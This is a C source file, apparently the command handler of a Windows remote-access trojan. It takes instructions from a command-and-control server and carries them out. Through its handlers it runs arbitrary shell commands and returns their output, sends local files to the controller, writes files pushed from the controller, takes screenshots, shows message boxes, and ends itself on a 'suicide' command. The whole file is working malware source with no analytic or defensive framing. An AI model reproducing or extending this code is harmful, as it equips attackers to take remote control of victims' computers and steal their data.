#include <windows.h>
#include "cnc.h"
#include "echo.h"
#include "shell.h"
#include "msgbox.h"
#include "logger.h"
#include "file.h"
#include "screenshot.h"
#include "commander.h"
#include "return_code.h"

void handle_echo()
{
    int return_code = 0;
    int bytes_read = 0;
    struct echo_cmd cmd = {};

    log_info("Received ECHO command.");
    if (cnc_recvall(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    while (cmd.bytes_remaining)
    {
        bytes_read = cnc_recvall(cmd.data, min(cmd.bytes_remaining, sizeof(cmd.data)));
        if (bytes_read == 0)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
        cmd.bytes_remaining -= bytes_read;
        if (cnc_send(cmd.data, bytes_read) != bytes_read)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
    }
cleanup:
    if (return_code)
        log_error("Failed to echo the data. Error code: %d", return_code);
    else
        log_info("Successfully echod the data.");
}

void handle_shell()
{
    int return_code = 0;
    unsigned long bytes_read = 0;
    struct shell_cmd cmd = {};

    log_info("Received SHELL command.");

    if (cnc_recvall(&cmd.cmd_len, sizeof(cmd.cmd_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    if ((cmd.cmd = malloc(cmd.cmd_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }

    if (cnc_recvall(cmd.cmd, cmd.cmd_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.cmd[cmd.cmd_len] = 0;

    log_info("Command: \"%s\"", cmd.cmd);
    shell(&cmd);

    while (TRUE)
    {
        bytes_read = shell_read_output(&cmd);
        if (bytes_read != 0)
        {
            if (cnc_send(&bytes_read, sizeof(bytes_read)) != sizeof(bytes_read))
            {
                return_code = E_CONNECTION_CLOSED;
                goto cleanup;
            }
            if (cnc_send(cmd.out, bytes_read) != bytes_read)
            {
                return_code = E_CONNECTION_CLOSED;
                goto cleanup;
            }
        }
        else if (WaitForSingleObject(cmd.proc_info.hProcess, 0) == WAIT_OBJECT_0)
        {
            if (cnc_send(&bytes_read, sizeof(bytes_read)) != sizeof(bytes_read))
            {
                return_code = E_CONNECTION_CLOSED;
                goto cleanup;
            }
            shell_close(&cmd);
            if (cnc_send(&cmd.exit_code, sizeof(cmd.exit_code)) != sizeof(cmd.exit_code))
            {
                return_code = E_CONNECTION_CLOSED;
                goto cleanup;
            }
            break;
        }
    }
cleanup:
    if (return_code)
        log_error("Failed to execute the command. Error code: %d", return_code);
    else
        log_info("Successfully executed the command.");
}

void handle_msgbox()
{
    int return_code = 0;
    struct msgbox_cmd cmd = {};

    log_info("Received MSGBOX command.");

    if (cnc_recvall(&cmd.title_len, sizeof(cmd.title_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.title = malloc(cmd.title_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (cnc_recvall(cmd.title, cmd.title_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.title[cmd.title_len] = 0;

    if (cnc_recvall(&cmd.text_len, sizeof(cmd.text_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.text = malloc(cmd.text_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (cnc_recvall(cmd.text, cmd.text_len) == 0)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.text[cmd.text_len] = 0;

    log_info("Title: \"%s\", Text: \"%s\"", cmd.title, cmd.text);
    MessageBox(NULL, cmd.text, cmd.title, MB_OK);

cleanup:
    if (cmd.title)
        free(cmd.title);
    if (cmd.text)
        free(cmd.text);

    if (return_code)
        log_error("Failed to show the message box. Error code: %d", return_code);
    else
        log_info("Successfully showed the message box.");
}

void handle_suicide()
{
    log_info("Received SUICIDE command.");
    exit(EXIT_SUCCESS);
}

void handle_upload_file()
{
    int return_code = 0;
    unsigned long bytes_read = -1;
    HANDLE file = NULL;
    struct file_cmd cmd = {};

    log_info("Received UPLOAD_FILE command.");

    if (cnc_recvall(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.local_path = malloc(cmd.local_path_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (cnc_recvall(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.local_path[cmd.local_path_len] = 0;

    if ((file = CreateFile(cmd.local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        return_code = E_FILE_NOT_FOUND;
        goto cleanup;
    }

    if (cnc_send(&return_code, sizeof(return_code)) != sizeof(return_code))
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    cmd.file_size = GetFileSize(file, NULL);
    log_info("Uploading file: %s (%lu)", cmd.local_path, cmd.file_size);
    if (cnc_send(&cmd.file_size, sizeof(cmd.file_size)) != sizeof(cmd.file_size))
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    while (bytes_read != 0)
    {
        if (!ReadFile(file, cmd.file_chunk, sizeof(cmd.file_chunk), &bytes_read, NULL))
        {
            return_code = E_FILE_READ_ERROR;
            goto cleanup;
        }

        if (cnc_send(cmd.file_chunk, bytes_read) != bytes_read)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }
    }

cleanup:
    if (cmd.local_path)
        free(cmd.local_path);
    if (file)
        CloseHandle(file);

    if (return_code)
        log_error("Failed to upload the file. Error code: %d", return_code);
    else
        log_info("Successfully uploaded the file.");
}

void handle_download_file()
{
    int return_code = 0;
    int bytes_read = 0;
    unsigned long long written_file_bytes = 0;
    HANDLE file = NULL;
    struct file_cmd cmd = {};

    log_info("Received DOWNLOAD_FILE command.");

    if (cnc_recvall(&cmd.local_path_len, sizeof(cmd.local_path_len)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    if ((cmd.local_path = malloc(cmd.local_path_len + 1)) == 0)
    {
        return_code = E_OUT_OF_MEMORY;
        goto cleanup;
    }
    if (cnc_recvall(cmd.local_path, cmd.local_path_len) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    cmd.local_path[cmd.local_path_len] = 0;

    if ((file = CreateFile(cmd.local_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        return_code = E_FILE_CREATE_ERROR;
        goto cleanup;
    }

    if (cnc_send(&return_code, sizeof(return_code)) != sizeof(return_code))
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }

    if (cnc_recvall(&cmd.file_size, sizeof(cmd.file_size)) == E_CONNECTION_CLOSED)
    {
        return_code = E_CONNECTION_CLOSED;
        goto cleanup;
    }
    log_info("Downloading file: %s (%lu)", cmd.local_path, cmd.file_size);

    while (written_file_bytes != cmd.file_size)
    {
        if ((bytes_read = cnc_recvall(cmd.file_chunk, min(cmd.file_size - written_file_bytes, sizeof(cmd.file_chunk)))) == E_CONNECTION_CLOSED)
        {
            return_code = E_CONNECTION_CLOSED;
            goto cleanup;
        }

        written_file_bytes += bytes_read;

        if (WriteFile(file, cmd.file_chunk, bytes_read, NULL, NULL) == 0)
        {
            return_code = E_FILE_WRITE_ERROR;
            goto cleanup;
        }
    }

cleanup:
    if (cmd.local_path)
        free(cmd.local_path);
    if (file)
        CloseHandle(file);

    if (return_code)
        log_error("Failed to download the file. Error code: %d", return_code);
    else
        log_info("Successfully downloaded the file.");
}

void handle_screenshot()
{
    int return_code = 0;
    return_code = screenshot();

    if (return_code)
        log_error("Failed to take a screenshot. Error code: %d", return_code);
    else
        log_info("Successfully took a screenshot.");
}

void listen_for_cmds()
{
    struct cmd cmd = {};
    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file, handle_screenshot};

    while (TRUE)
    {
        log_info("Waiting for command.");
        if (cnc_recvall(&cmd, sizeof(struct cmd)) == E_CONNECTION_CLOSED)
        {
            log_error("Received invalid command.");
            continue;
        }
        cmd_type_handler[cmd.type]();
    }
}
